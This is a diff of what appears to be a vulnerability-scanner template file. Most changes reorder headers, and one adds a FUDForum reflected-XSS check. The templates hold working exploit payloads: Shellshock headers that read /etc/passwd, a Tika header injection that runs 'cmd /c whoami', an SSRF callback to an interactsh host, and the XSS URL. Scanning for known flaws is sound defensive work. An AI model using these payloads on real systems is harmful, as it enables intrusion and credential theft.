@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6360,11 +6360,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -9463,8 +9463,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -14398,6 +14398,21 @@
         {
           "raw": [
             "POST /api/snapshots HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"dashboard\": {\"editable\":false,\"hideControls\":true,\"nav\":[{\"enable\":false,\"type\":\"timepicker\"}],\"rows\": [{}],\"style\":\"dark\",\"tags\":[],\"templating\":{\"list\":[]},\"time\":{},\"timezone\":\"browser\",\"title\":\"Home\",\"version\":5},\"expires\": 3600}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-27519",
+      "info": {
+        "name": "FUDForum 3.1.0 - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?SQ=0&srch=x\"+onmouseover%3Dalert%281%29+x%3D\"&t=search&btn_submit.x=0&btn_submit.y=0"
           ]
         }
       ]
